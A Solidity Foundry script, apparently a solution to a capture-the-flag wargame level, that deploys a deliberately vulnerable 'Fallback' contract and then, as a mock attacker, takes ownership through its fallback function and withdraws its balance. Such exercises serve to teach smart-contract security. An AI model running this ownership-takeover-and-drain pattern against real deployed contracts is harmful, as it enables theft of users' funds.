// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "../src/Fallback.sol";

contract FallbackScript is Script {
  function setUp() public {}

  function run () public {
    uint256 attackerPrivateKey = vm.envUint("PRIVATE_KEY");
    uint256 deployerPrivateKey = vm.envUint("TEST_DEPLOYER_PRIVATE_KEY");

    // Deploy vulnerable Fallback
    vm.startBroadcast(deployerPrivateKey);
    Fallback fallbackContract = new Fallback();

    vm.stopBroadcast();

    // Mock attacker
    vm.startBroadcast(attackerPrivateKey);
    fallbackContract.contribute{value: 0.0001 ether}();
    console.log("contrib", fallbackContract.getContribution());
    (bool sent, ) = address(fallbackContract).call{value: 0.0001 ether}("");
    console.log("sent", sent);
    console.log("owner",fallbackContract.owner());
    fallbackContract.withdraw();
    vm.stopBroadcast();

    console.log("owner", fallbackContract.owner());
  }
}